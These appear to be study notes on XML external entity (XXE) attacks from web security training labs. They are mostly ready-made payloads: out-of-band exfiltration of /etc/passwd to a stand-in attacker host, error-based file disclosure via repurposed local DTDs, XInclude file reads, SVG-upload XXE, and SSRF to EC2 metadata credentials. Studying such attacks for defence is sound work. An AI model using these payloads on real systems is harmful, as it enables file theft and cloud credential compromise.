## General info
#### Detecting blind XXE using out-of-band (OAST) techniques
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
- This technique might not work with some file contents, including the newline characters contained in the 
  /etc/passwd file because of URL allowed characters.
- Use FTP instead of HTTP 
- Sometimes, it will not be possible to exfiltrate data containing newline characters, and so a file such as /etc/hostname can be targeted instead
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

#### How to locate existing DTD file to repurpose it
- find a list of known dtds
- enumerate local DTD files just by attempting to load them from within the internal DTD
- for example, Linux systems using the GNOME desktop environment often have a DTD file at 
  **/usr/share/yelp/dtd/docbookx.dtd**
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
- after you have tested a list of common DTD files to locate a file that is present, you then need to obtain a copy 
  of the file and review it to find an entity that you can redefine —> use OSS repo to gain that file
- use this [list](https://github.com/GoSecure/dtd-finder/tree/master/list)
- grab the list of dtds
- using intruder brute paths
- don’t forget to uncheck URL-encoding, you don’t need it for paths on server
- example of [payloads](https://gosecure.ai/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/)
- systems using the GNOME desktop environment often have a DTD at **/usr/share/yelp/dtd/docbookx.dtd** containing an 
  entity called **ISOamso**

#### XInclude attacks
You can place an **XInclude** attack within any data value in an XML document, so **the attack can be performed in 
situations where you only control a single item of data that is placed into a server-side XML document**. To attack 
reference the XInclude namespace and provide the path to the file that you wish to include:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
- Hint: By default, XInclude will try to parse the included document as XML. Since **/etc/passwd** isn't valid XML, you will need to add an extra attribute to the XInclude directive to change this behavior.

#### XXE attacks via modified content type
- For example, if a normal request contains the following:
```
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
- Then you might be able to submit the following request, with the same result:
```
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
- If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format

## LAB payloads
#### Exploiting XXE using external entities to retrieve files
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE payload [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

#### Exploiting XXE to perform SSRF attacks
The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. 
```xml
<!DOCTYPE payload [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/">]>
<stockCheck>
<productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

#### Exploiting blind XXE to retrieve data via error messages
- this one should be sent to check stock endpoint:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://exploit-...exploit-server.net/exploit"> %xxe;]>
```
- this one should be stored at exploit server:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

#### Exploiting blind xxe by repurposing a local dtd
- define an XML parameter entity called **local_dtd**, containing the contents of the external DTD file that exists 
  on the server filesystem.
- redefine the XML parameter entity called **custom_entity**, which is already defined in the external DTD file
- use the local_dtd entity, so that the external DTD is interpreted, including the redefined value of the 
  **custom_entity** entity. This results in the desired error message
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

#### Exploiting XXE to retrieve data by repurposing a local DTD
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

#### Exploiting XInclude to retrieve files
- find that for /product/stock changing of productId causes error:
```xml
<kok xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></kok>
```

#### Exploiting XXE via image file upload
- create local svg file
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```
- upload it as an avatar in comment section

#### Blind XXE with out-of-band interaction (collab)
TODO

#### Blind XXE with out-of-band interaction via XML parameter entities
TODO

#### Exploiting blind XXE to exfiltrate data using a malicious external DTD
TODO
